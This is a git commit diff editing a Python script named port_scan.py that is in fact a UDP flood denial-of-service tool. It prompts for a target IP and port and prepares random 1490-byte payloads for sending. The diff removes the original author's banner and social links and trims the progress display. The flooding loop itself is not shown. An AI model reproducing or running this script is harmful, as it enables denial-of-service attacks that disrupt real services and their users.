09088d0f7117138f5a8155946d3aa903f77cfb86
root <root@instance-1.c.annular-system-275800.internal>
2020-04-30 23:44:35 +0000

    attacks

--- final_attack/port_scan.py
+++ final_attack/port_scan.py
@@ -3,40 +3,17 @@ import os
 import time
 import socket
 import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
 os.system("clear")
-os.system("figlet DDos Attack")
-print()
-print ("Author   : HA-MRX")
-print ("You Tube : https://www.youtube.com/c/HA-MRX")
-print ("github   : https://github.com/Ha3MrX")
-print ("Facebook : https://www.facebook.com/muhamad.jabar222")
-print
+print("DOS ATTACK")
 ip = input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
-print ("[                    ] 0% ")
-time.sleep(5)
-print ("[=====               ] 25%")
-time.sleep(5)
+print("Attack Starting")
 print ("[==========          ] 50%")
-time.sleep(5)
-print ("[===============     ] 75%")
 time.sleep(5)
 print ("[====================] 100%")
 time.sleep(3)
